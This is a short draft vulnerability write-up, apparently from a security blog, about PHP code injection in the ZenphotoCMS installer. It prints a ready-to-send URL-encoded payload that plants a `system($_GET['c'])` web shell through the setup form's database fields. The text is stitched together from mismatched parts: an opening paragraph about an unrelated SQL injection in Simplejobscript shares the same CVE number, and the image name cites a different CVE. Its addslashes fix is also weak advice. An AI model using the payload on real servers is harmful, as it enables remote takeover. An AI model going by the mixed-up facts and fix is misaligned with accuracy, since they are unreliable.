---
cve: "CVE-2020-9997"
title: "Code injection in ZenphotoCMS v1.5.6 and prior"
date: 2020-02-11
draft: yes
tags:
- code injection
- rce
---
An issue was discovered in Simplejobscript.com SJS through 1.66. There is an unauthenticated SQL injection via the job applications search function. The vulnerable parameter is `job_id`. The function is `getJobApplicationsByJobId()`. The file is `_lib/class.JobApplication.php`.

- mitre: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9997

<hr />

**Description:**  
The installation process is prone to PHP code injection which leads to a remote code execution. The vulnerable POST parameters are:
`db_software`, `db_user`, `db_pass`, `db_host`, `db_database`

**Environment:**  
Version: 1.5.6  
OS: Ubuntu 16.10  
Web server: Apache 2.4.18  
PHP: 7.4.2  
Database: MySQL 5.7.28  
URL: `/zp-core/setup/`  

**Payload:**  
```db=yes&xsrfToken=490edd5bf985248c832425d350602f5bb1c8043d&db_software=MySQLi%22%3Bsystem%28%24_GET%5B%27c%27%5D%29.%22&db_user=test%22%3Bsystem%28%24_GET%5B%27c%27%5D%29.%22&db_pass=test&db_host=localhost%22%3Bsystem%28%24_GET%5B%27c%27%5D%29.%22&db_database=zenphoto%22%3Bsystem%28%24_GET%5B%27c%27%5D%29.%22&db_prefix=zp_```

**Recommendation:**  
A simple addslashes would do the trick to protect against single and double quotes.

**PoC:**  
![cve-2020-2997](/images/cve-2020-2997.png)
